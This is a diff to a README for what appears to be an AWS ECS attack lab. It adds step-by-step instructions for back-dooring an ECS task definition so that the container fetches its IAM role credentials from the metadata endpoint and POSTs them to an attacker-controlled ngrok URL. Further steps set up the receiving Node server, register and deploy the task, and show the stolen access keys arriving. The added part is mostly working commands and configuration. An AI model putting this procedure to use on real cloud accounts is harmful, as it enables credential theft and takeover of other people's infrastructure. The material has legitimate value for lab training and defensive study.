@@ -104,9 +104,61 @@ cd ecs_efs_attack<random generated strings>
   ```
 4. Describe the task definition and output to a file so we are able to change the behaviour
   ```
-  aws ecs describe-task-definition --task-definition webapp:1 > taskdef.json
-  
-
+  aws ecs describe-task-definition --task-definition webapp:1 > backdoor.json
+  ```
+5. Change backdoor.json to the following:
+```
+{
+	"containerDefinitions": [{
+		"name": "webapp",
+		"image": "python:latest",
+		"cpu": 128,
+		"memory": 128,
+		"memoryReservation": 64,
+		"portMappings": [{
+			"containerPort": 80,
+			"hostPort": 80,
+			"protocol": "tcp"
+		}],
+		"essential": true,
+		"entryPoint": ["sh", "-c"],
+		"command": [
+			"/bin/sh -c \"curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI > data.json && curl -X POST -d @data.json <NGROK URL>/data \" "
+		],
+		"environment": [],
+		"mountPoints": [],
+		"volumesFrom": []
+	}],
+	"family": "webapp",
+	"taskRoleArn": "<task role arn>",
+	"executionRoleArn": "<task role arn>",
+	"networkMode": "awsvpc",
+	"volumes": [],
+	"placementConstraints": [],
+	"requiresCompatibilities": ["FARGATE"],
+	"cpu": "256",
+	"memory": "512"
+}
+```
+6. In order to create a ngrok url, we can firstly create a http server using node.js and then use ngrok to host the service.
+    1. To create an http server, install node on your machine: https://nodejs.org/en/download
+        1. Create a index.js file with the contents of index.js in this repository
+        2. Run the http server: ```node index.js```
+        3. Validate that is working by going to ```http://localhost:8080
+    2. To host your http server, follow the steps to install ngrok: https://ngrok.com/download
+      1. Once you have successfully ran the installations, start a tunnel by typing: ```ngrok http 8080```
+      2. There should be a Forwarding url that will be displayed in which your website will be hosted, use that url as the NGROK URL above.
+      ![image](https://user-images.githubusercontent.com/39514108/232182632-27d9dd76-7cf7-42e5-8858-6ff701f980e9.png)
+      3. Validate that you are able to post data to the NGROK url by using ```curl -X POST -d "random string" <NGROK URL>/data```
+7. Register the task
+```
+aws ecs register-task-definition --cli-input-json file://backdoor.json
+aws ecs update-service --serivce <service ARN> --cluster <cluster ARN> --task-definition <task ARN>
+```
+8. After a few minutes, you should see that the credentials are sent through in the Node terminal or in the ngrok web interface in the following format
+```
+{"RoleArn":<ROLEARN>, "AccessKeyId": <AccessKeyId> "SecretAccessKey":<SecretAccessKey">}
+```
   
 # Trouble Shooting
 ## Installation
